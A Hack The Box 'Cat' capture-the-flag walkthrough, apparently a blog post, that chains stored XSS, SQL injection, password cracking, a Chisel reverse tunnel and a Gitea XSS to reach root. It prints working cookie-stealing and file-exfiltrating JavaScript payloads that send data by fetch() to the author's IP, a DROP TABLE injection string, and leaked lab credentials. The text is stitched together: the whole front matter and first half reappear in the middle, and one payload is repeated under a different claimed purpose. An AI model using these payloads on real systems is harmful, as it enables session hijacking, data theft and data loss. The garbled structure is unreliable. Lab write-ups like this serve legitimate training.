---
title: Cat - Hack The Box Writeup
date: 2025-02-03
categories: [CTF, Writeups, HTB]
tags: [htb, linux, rce, lfi, stored-xss, privilege-escalation, gitea]
image:
  path: /assets/images/htb-cat.jpg
description: A detailed walkthrough of the Cat HTB machine, showcasing exploitation of stored XSS, SQL injection, and Gitea vulnerabilities.
author: l4tmur
---

## Nmap Recon and Initial Enumeration  

To begin our reconnaissance, we run an **Nmap** scan to identify open ports and services on the target machine:  

```sh
nmap -sV 10.10.11.53 -T5 -Pn
```

![](/assets/images/Pasted%20image%2020250203031230.png)

The scan results reveal that **Port 22 (SSH) and Port 80 (HTTP)** are open.  

Next, we attempt to access the website by entering the machine's IP address in a browser. Instead of a standard page, we notice that the hostname **cat.htb** is referenced. To resolve this domain locally, we add it to our **/etc/hosts** file:  

```sh
echo "10.10.11.53 cat.htb" | sudo tee -a /etc/hosts
```

With this update, we can now access **cat.htb** in our browser to further explore potential attack vectors.

---

## Exploring the Application  

Before diving deeper, let's explore the application to get an overall idea.  

![](/assets/images/Pasted%20image%2020250203032244.png)

The website appears to be a community page for cat lovers, featuring a **voting system**.  

On further inspection, we find a voting section:  

![](/assets/images/Pasted%20image%2020250203032336.png)

However, voting is currently **closed**. This suggests that additional functionalities might be accessible after logging in.  

### Checking Cookies  
Even before logging in, we notice that the application assigns cookies to our session:  

![](/assets/images/Pasted%20image%2020250203032600.png)

### Logging In  
After logging in, we gain access to more features, including the ability to participate in contests. Interestingly, there is also a **file upload option**, which could potentially lead to **Remote Code Execution (RCE)**—something worth investigating further.  

### Subdomain & Directory Enumeration  
Meanwhile, we check for subdomains but find nothing significant. Next, we perform **directory enumeration** using `dirsearch` with a default wordlist:  

```sh
dirsearch -u http://cat.htb/
```

During enumeration, we discover a **.git** directory:  

![](/assets/images/Pasted%20image%2020250203031548.png)

### Extracting .git Repository  
To leverage this, we use a tool called **git-dumper**, which helps automate the extraction of `.git` repositories. This tool checks if directory listing is enabled and recursively downloads the `.git` contents for further analysis.

---

## Reviewing Extracted Source Code  

![](/assets/images/Pasted%20image%2020250203032015.png)

After extracting the `.git` directory, we now have access to a large portion of the source code. This provides us with a deeper understanding of the application's structure and potential vulnerabilities.  

With this information, we can proceed to analyze the source code and identify exploitable weaknesses.  

---

## Identifying Vulnerabilities  

### 1. Stored XSS in Registration (join.php)  

Upon reviewing `join.php`, we notice an **unsanitized user input** being directly stored in the database during registration:  

```php
// Registration process

// Vulnerable registration code
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];  //  Unsanitized input
    $email = $_GET['email'];        //  Unsanitized input

    $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
    $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);
}
```

Here, the `username` and `email` fields are **not sanitized or validated** before being stored in the database. This allows an attacker to inject **Stored XSS** payloads.  

#### Example Attack:  

An attacker could register with the following username:  

```
Username: <script>alert(document.cookie)</script>
Email: attacker@evil.com
```

Since the input is stored in the database without sanitization, whenever this username is displayed, the malicious script executes, potentially stealing cookies from other users.  

This could be leveraged for **session hijacking** or further attacks within the application.  

---

### 2. SQL Injection in accept_cat.php  

Analyzing `accept_cat.php`, we find another major vulnerability: **SQL Injection** due to direct user input in SQL queries.  

![](/assets/images/Pasted%20image%2020250203040433.png)

```php
// VULNERABLE CODE:
$cat_name = $_POST['catName'];
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
```

Here's why this is dangerous:  
- **`$cat_name` is not sanitized** before being used in the SQL query.  
- **String concatenation is used**, making it prone to SQL injection attacks.  
- **`exec()` is used instead of prepared statements**, leaving the application exposed.  

#### Example Attack:  

An attacker could send a POST request with:  

```
catName = '); DROP TABLE accepted_cats; --
```

This would result in the following SQL query execution:  

```
INSERT INTO accepted_cats (name) VALUES (''); DROP TABLE accepted_cats; --')
```

If executed, this would **delete the entire `accepted_cats` table**, causing major data loss.  

---

But here, to exploit this, we need to gain access to the **Axel user**.

![](/assets/images/Pasted%20image%2020250203040433.png)

That's a problem, so let's try to gain access to Axel (maybe by stealing cookies through the stored XSS we found).

But how are we going to make Axel view our username so that he can see it?

When I checked `contest.php`, we can see that Axel is the admin.

![](/assets/images/Pasted%20image%2020250203041908.png)

When exploring the `admin.php`, it's checking whether the user is `Axel`.

Later, if we go further, we can see he is the guy who can either accept or reject the cat which we submitted for the contest!

When the admin reviews, our payload is shown because of this line:

```php
echo "Submitted by: " .$row['owner_username'];
```

```
[Registration]
       ↓
[Malicious Username Stored]
       ↓
[Contest Submission]
       ↓
[Admin Reviews]
       ↓
[Script Executes]
       ↓
[Cookie Stolen]
```

Basically, this is the flow. Now, let's execute it!

I used a basic payload since there is no need to bypass anything:

```html
<script>document.location='http://10.10.14.17:1111/?c='+document.cookie;</script>
```

Don't forget to start the web server:

```sh
python3 -m http.server 1111
```

![](/assets/images/Pasted%20image%2020250203043104.png)

![](/assets/images/Pasted%20image%2020250203043224.png)

After a few seconds, we got a cookie for the admin - Axel.

![](/assets/images/Pasted%20image%2020250203043309.png)

Let's use that. Now we can see the admin panel.

![](/assets/images/Pasted%20image%2020250203043350.png)

![](/assets/images/Pasted%20image%2020250203043454.png)

Remember, we found an SQLi in `accept_cat.php`.

`$cat_name` is used directly in the SQL query without any sanitization.

Let's try to dump the database. You can see that when I tried to add a single colon, it throws an internal server error, confirming the vulnerability!

Copy the request, paste it into a file, and run SQLmap.

![](/assets/images/Pasted%20image%2020250203044615.png)

![](/assets/images/Pasted%20image%2020250203044631.png)

In the user table, we can see many password hashes.

![](/assets/images/Pasted%20image%2020250203052021.png)

Let's try to crack each. For Rosa, the password hash was cracked.

![](/assets/images/Pasted%20image%2020250203052254.png)

Let's try to log in via SSH:

```
rosa:soyunaprincesarosa
```

![](/assets/images/Pasted%20image%2020250203052436.png)

But no user flag.

![](/assets/images/Pasted%20image%2020250203052515.png)

There are totally 4 users in the machine.

After some time, when checking the Apache log, we can find the login credentials for the user Axel:

```sh
cat /var/log/apache2/access.log
```
---
title: Cat - Hack The Box Writeup
date: 2025-02-03
categories: [CTF, Writeups, HTB]
tags: [htb, linux, rce, lfi, stored-xss, privilege-escalation, gitea]
image:
  path: /assets/images/htb-cat-writeup/htb-cat.jpg
description: A detailed walkthrough of the Cat HTB machine, showcasing exploitation of stored XSS, SQL injection, and Gitea vulnerabilities.
author: l4tmur
---

## Nmap Recon and Initial Enumeration  

To begin our reconnaissance, we run an **Nmap** scan to identify open ports and services on the target machine:  

```sh
nmap -sV 10.10.11.53 -T5 -Pn
```

![](/assets/images/Pasted%20image%2020250203031230.png)

The scan results reveal that **Port 22 (SSH) and Port 80 (HTTP)** are open.  

Next, we attempt to access the website by entering the machine's IP address in a browser. Instead of a standard page, we notice that the hostname **cat.htb** is referenced. To resolve this domain locally, we add it to our **/etc/hosts** file:  

```sh
echo "10.10.11.53 cat.htb" | sudo tee -a /etc/hosts
```

With this update, we can now access **cat.htb** in our browser to further explore potential attack vectors.

---

## Exploring the Application  

Before diving deeper, let's explore the application to get an overall idea.  

![](/assets/images/Pasted%20image%2020250203032244.png)

The website appears to be a community page for cat lovers, featuring a **voting system**.  

On further inspection, we find a voting section:  

![](/assets/images/Pasted%20image%2020250203032336.png)

However, voting is currently **closed**. This suggests that additional functionalities might be accessible after logging in.  

### Checking Cookies  
Even before logging in, we notice that the application assigns cookies to our session:  

![](/assets/images/Pasted%20image%2020250203032600.png)

### Logging In  
After logging in, we gain access to more features, including the ability to participate in contests. Interestingly, there is also a **file upload option**, which could potentially lead to **Remote Code Execution (RCE)**—something worth investigating further.  

### Subdomain & Directory Enumeration  
Meanwhile, we check for subdomains but find nothing significant. Next, we perform **directory enumeration** using `dirsearch` with a default wordlist:  

```sh
dirsearch -u http://cat.htb/
```

During enumeration, we discover a **.git** directory:  

![](/assets/images/Pasted%20image%2020250203031548.png)

### Extracting .git Repository  
To leverage this, we use a tool called **git-dumper**, which helps automate the extraction of `.git` repositories. This tool checks if directory listing is enabled and recursively downloads the `.git` contents for further analysis.

---

## Reviewing Extracted Source Code  

![](/assets/images/Pasted%20image%2020250203032015.png)

After extracting the `.git` directory, we now have access to a large portion of the source code. This provides us with a deeper understanding of the application's structure and potential vulnerabilities.  

With this information, we can proceed to analyze the source code and identify exploitable weaknesses.  

---

## Identifying Vulnerabilities  

### 1. Stored XSS in Registration (join.php)  

Upon reviewing `join.php`, we notice an **unsanitized user input** being directly stored in the database during registration:  

```php
// Registration process

// Vulnerable registration code
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];  //  Unsanitized input
    $email = $_GET['email'];        //  Unsanitized input

    $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
    $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);
}
```

Here, the `username` and `email` fields are **not sanitized or validated** before being stored in the database. This allows an attacker to inject **Stored XSS** payloads.  

#### Example Attack:  

An attacker could register with the following username:  

```
Username: <script>alert(document.cookie)</script>
Email: attacker@evil.com
```

Since the input is stored in the database without sanitization, whenever this username is displayed, the malicious script executes, potentially stealing cookies from other users.  

This could be leveraged for **session hijacking** or further attacks within the application.  

---

### 2. SQL Injection in accept_cat.php  

Analyzing `accept_cat.php`, we find another major vulnerability: **SQL Injection** due to direct user input in SQL queries.  

![](/assets/images/Pasted%20image%2020250203040433.png)

```php
// VULNERABLE CODE:
$cat_name = $_POST['catName'];
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
```

Here's why this is dangerous:  
- **`$cat_name` is not sanitized** before being used in the SQL query.  
- **String concatenation is used**, making it prone to SQL injection attacks.  
- **`exec()` is used instead of prepared statements**, leaving the application exposed.  

#### Example Attack:  

An attacker could send a POST request with:  

```
catName = '); DROP TABLE accepted_cats; --
```

This would result in the following SQL query execution:  

```
INSERT INTO accepted_cats (name) VALUES (''); DROP TABLE accepted_cats; --')
```

If executed, this would **delete the entire `accepted_cats` table**, causing major data loss.  

---

But here, to exploit this, we need to gain access to the **Axel user**.

![](/assets/images/Pasted%20image%2020250203040433.png)

That's a problem, so let's try to gain access to Axel (maybe by stealing cookies through the stored XSS we found).

But how are we going to make Axel view our username so that he can see it?

When I checked `contest.php`, we can see that Axel is the admin.

![](/assets/images/Pasted%20image%2020250203041908.png)

When exploring the `admin.php`, it's checking whether the user is `Axel`.

Later, if we go further, we can see he is the guy who can either accept or reject the cat which we submitted for the contest!

When the admin reviews, our payload is shown because of this line:

```php
echo "Submitted by: " .$row['owner_username'];
```

```
[Registration]
       ↓
[Malicious Username Stored]
       ↓
[Contest Submission]
       ↓
[Admin Reviews]
       ↓
[Script Executes]
       ↓
[Cookie Stolen]
```

Basically, this is the flow. Now, let's execute it!

I used a basic payload since there is no need to bypass anything:

```html
<script>document.location='http://10.10.14.17:1111/?c='+document.cookie;</script>
```

Don't forget to start the web server:

```sh
python3 -m http.server 1111
```

![](/assets/images/Pasted%20image%2020250203043104.png)

![](/assets/images/Pasted%20image%2020250203043224.png)

After a few seconds, we got a cookie for the admin - Axel.

![](/assets/images/Pasted%20image%2020250203043309.png)

Let's use that. Now we can see the admin panel.

![](/assets/images/Pasted%20image%2020250203043350.png)

![](/assets/images/Pasted%20image%2020250203043454.png)

Remember, we found an SQLi in `accept_cat.php`.

`$cat_name` is used directly in the SQL query without any sanitization.

Let's try to dump the database. You can see that when I tried to add a single colon, it throws an internal server error, confirming the vulnerability!

Copy the request, paste it into a file, and run SQLmap.

![](/assets/images/Pasted%20image%2020250203044615.png)

![](/assets/images/Pasted%20image%2020250203044631.png)

In the user table, we can see many password hashes.

![](/assets/images/Pasted%20image%2020250203052021.png)

Let's try to crack each. For Rosa, the password hash was cracked.

![](/assets/images/Pasted%20image%2020250203052254.png)

Let's try to log in via SSH:

```
rosa:soyunaprincesarosa
```

![](/assets/images/Pasted%20image%2020250203052436.png)

But no user flag.

![](/assets/images/Pasted%20image%2020250203052515.png)

There are totally 4 users in the machine.

After some time, when checking the Apache log, we can find the login credentials for the user Axel:

```sh
cat /var/log/apache2/access.log
```

![](/assets/images/Pasted%20image%2020250203053506.png)

Which is:

```
axel : aNdZwgC4tI9gnVXv_e3Q
```

![](/assets/images/Pasted%20image%2020250203053933.png)

Whoay! We got user flag!

When surfing around the machine I didn't find anything for root. When checking `/var/mail/axel`, we can see the mail.

![](/assets/images/Pasted%20image%2020250203060641.png)

I checked for the services running & yes Gitea is there in port 3000 as mentioned in the mail.

I am sure this is clearly a hint for privilege escalation. At this point I am not sure what's that for, lol!

```
Jobert will check if it is a promising service that we can develop.
```

Here Jobert is our another user & maybe to enter into Jobert account maybe? Let's see.

![](/assets/images/Pasted%20image%2020250203054030.png)

![](/assets/images/Pasted%20image%2020250203054142.png)

Let's do port forward. I used Chisel here.

On our machine:

```sh
./chisel server -p 5678 --reverse
```

On victim machine:

```sh
./chisel client 10.10.14.17:5678 R:3000:127.0.0.1:3000
```

![](/assets/images/Pasted%20image%2020250203054834.png)
It's Connected!

Let's login using `axel` credentials which we got and successfully it worked.

![](/assets/images/Pasted%20image%2020250203054929.png)

If you see bottom of the page, there is a version number.

![](/assets/images/Pasted%20image%2020250203055010.png)

Let's check for some CVE's maybe! Because there is no repositories or nothing.

![](/assets/images/Pasted%20image%2020250203055108.png)

![](/assets/images/Pasted%20image%2020250203055143.png)

Here it is stored xss , Now if you guys remember about the mail .. things started matching 

Also note in the mail , rosa mentioned 
```
Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.
```

Here in the exploit , we are gonna insert the payload in the `description` only ! 

Maybe another session stealing but for Jobert this time  ??

lets try by crafting our payload , this is our basic one

```html
<a href=javascript:alert()>XSS test</a>
```

I modified like this ,

```html
<a href="javascript:fetch('http://10.10.14.17:1111/?d='+encodeURIComponent(btoa(document.cookie)));">XSS test</a>
```

Also for sending mail use this ,

```bash
echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/l4tmur" | sendmail jobert@cat.htb
```

to confirm its working u can check the file size , it will rapidly change after excuting the command 

![](/assets/images/Pasted%20image%2020250203070144.png)

see , now we started getting requests 

![](/assets/images/Pasted%20image%2020250203065934.png)

But it didnt work as expected , but i got a callback so need to plan other idea 

Again , i went to read the second mail , i remember they talked about private repo..

I tried to read the README.md file by using this payload and it worked

```html
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.17:1111/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```

![](/assets/images/Pasted%20image%2020250203063003.png)

When i decrypt , it useless info

I tried to access index.php since it is the most common path 

```html
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.17:1111/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```

![](/assets/images/Pasted%20image%2020250203064959.png)
It returned with some large data , when i decrypt 

```php
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
```

I got admin creds for the application , i tried to login in gitea but it didnt worked 

checked for SSH as root and it worked 

![](/assets/images/Pasted%20image%2020250203065322.png)

Pwned !

## Funny thing is ,

I got a brother when doing the machine , he saw my gitea repo having my ip , we talked like this 

![](/assets/images/Pasted%20image%2020250202235006.png)

![](/assets/images/Pasted%20image%2020250202235022.png)

HAHA !

## Note : Dont forgot to add a file otherwise u wont get a callback . i got stucked for hours because of this shit 

if u upload the file , our description will be in front like this ,

![](/assets/images/Pasted%20image%2020250203065849.png)




![](/assets/images/Pasted%20image%2020250203053506.png)

Which is:

```
axel : aNdZwgC4tI9gnVXv_e3Q
```

![](/assets/images/Pasted%20image%2020250203053933.png)

Whoay! We got user flag!

When surfing around the machine I didn't find anything for root. When checking `/var/mail/axel`, we can see the mail.

![](/assets/images/Pasted%20image%2020250203060641.png)

I checked for the services running & yes Gitea is there in port 3000 as mentioned in the mail.

I am sure this is clearly a hint for privilege escalation. At this point I am not sure what's that for, lol!

```
Jobert will check if it is a promising service that we can develop.
```

Here Jobert is our another user & maybe to enter into Jobert account maybe? Let's see.

![](/assets/images/Pasted%20image%2020250203054030.png)

![](/assets/images/Pasted%20image%2020250203054142.png)

Let's do port forward. I used Chisel here.

On our machine:

```sh
./chisel server -p 5678 --reverse
```

On victim machine:

```sh
./chisel client 10.10.14.17:5678 R:3000:127.0.0.1:3000
```

![](/assets/images/Pasted%20image%2020250203054834.png)
It's Connected!

Let's login using `axel` credentials which we got and successfully it worked.

![](/assets/images/Pasted%20image%2020250203054929.png)

If you see bottom of the page, there is a version number.

![](/assets/images/Pasted%20image%2020250203055010.png)

Let's check for some CVE's maybe! Because there is no repositories or nothing.

![](/assets/images/Pasted%20image%2020250203055108.png)

![](/assets/images/Pasted%20image%2020250203055143.png)

Here it is stored xss , Now if you guys remember about the mail .. things started matching 

Also note in the mail , rosa mentioned 
```
Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.
```

Here in the exploit , we are gonna insert the payload in the `description` only ! 

Maybe another session stealing but for Jobert this time  ??

lets try by crafting our payload , this is our basic one

```html
<a href=javascript:alert()>XSS test</a>
```

I modified like this ,

```html
<a href="javascript:fetch('http://10.10.14.17:1111/?d='+encodeURIComponent(btoa(document.cookie)));">XSS test</a>
```

Also for sending mail use this ,

```bash
echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/l4tmur" | sendmail jobert@cat.htb
```

to confirm its working u can check the file size , it will rapidly change after excuting the command 

![](/assets/images/Pasted%20image%2020250203070144.png)

see , now we started getting requests 

![](/assets/images/Pasted%20image%2020250203065934.png)

But it didnt work as expected , but i got a callback so need to plan other idea 

Again , i went to read the second mail , i remember they talked about private repo..

I tried to read the README.md file by using this payload and it worked

```html
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.17:1111/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```

![](/assets/images/Pasted%20image%2020250203063003.png)

When i decrypt , it useless info

I tried to access index.php since it is the most common path 

```html
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.17:1111/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```

![](/assets/images/Pasted%20image%2020250203064959.png)
It returned with some large data , when i decrypt 

```php
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
```

I got admin creds for the application , i tried to login in gitea but it didnt worked 

checked for SSH as root and it worked 

![](/assets/images/Pasted%20image%2020250203065322.png)

Pwned !

## Funny thing is ,

I got a brother when doing the machine , he saw my gitea repo having my ip , we talked like this 

![](/assets/images/Pasted%20image%2020250202235006.png)

![](/assets/images/Pasted%20image%2020250202235022.png)

HAHA !

## Note : Dont forgot to add a file otherwise u wont get a callback . i got stucked for hours because of this shit 

if u upload the file , our description will be in front like this ,

![](/assets/images/Pasted%20image%2020250203065849.png)



